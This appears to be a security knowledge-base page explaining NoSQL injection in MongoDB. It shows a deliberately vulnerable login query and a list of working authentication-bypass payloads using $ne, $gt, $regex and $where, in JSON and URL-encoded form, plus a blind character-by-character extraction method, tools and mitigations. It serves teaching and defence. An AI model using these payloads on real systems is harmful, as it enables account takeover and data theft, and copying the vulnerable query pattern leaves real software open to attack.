# What is NoSQL Injection?

NoSQL injection is the NoSQL cousin of [SQL injection](SQL%20Injection.md). Databases like MongoDB do not use SQL, but they still build queries from user input - often as JSON objects or JavaScript. Pass untrusted input into those queries and you can bypass authentication, extract data, or run server-side JavaScript.

## How it works (MongoDB example)

A login query built from request data:

```javascript
// VULNERABLE
db.users.find({ username: req.body.username, password: req.body.password });
```

If the app accepts JSON, send operators instead of strings:

```json
{ "username": "admin", "password": { "$ne": "" } }
```

`$ne: ""` means "password not equal to empty," which is true for any password - instant auth bypass.

## Operator injection payloads

```json
{ "username": {"$ne": null}, "password": {"$ne": null} }
{ "username": {"$gt": ""}, "password": {"$gt": ""} }
{ "username": "admin", "password": {"$regex": "^a"} }   // blind, char by char
{ "username": {"$in": ["admin","root"]} }
```

In URL-encoded form fields, the same idea looks like:

```text
username[$ne]=&password[$ne]=
username=admin&password[$regex]=^a
```

## Operator / JavaScript injection

Some engines allow `$where` with server-side JavaScript:

```json
{ "$where": "this.password == this.password || '1'=='1'" }
{ "$where": "sleep(5000)" }    // time-based blind confirmation
```

## Blind extraction

No direct output? Use `$regex` to leak the password one character at a time - true/false responses tell you each correct character. This is the same logic as blind SQLi.

## Tools

- [Burp Suite](../../Tools/Burp%20Suite.md) Repeater/Intruder (switch content-type to JSON)
- `NoSQLMap` for automation
- `nosqli` CLI scanner

## Mitigation

- Validate and cast input to the expected type (reject objects where a string is expected).
- Use parameterized / typed query builders; never pass raw request bodies into queries.
- Disable server-side JavaScript (`$where`, `mapReduce`) unless truly needed.
- Apply least-privilege database accounts.

## CWE

- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

## Deep dive

- [PortSwigger NoSQL injection labs](https://portswigger.net/web-security/nosql-injection)
- [Injection - OWASP Top 10](../OWASP%20Top%2010/Injection.md)
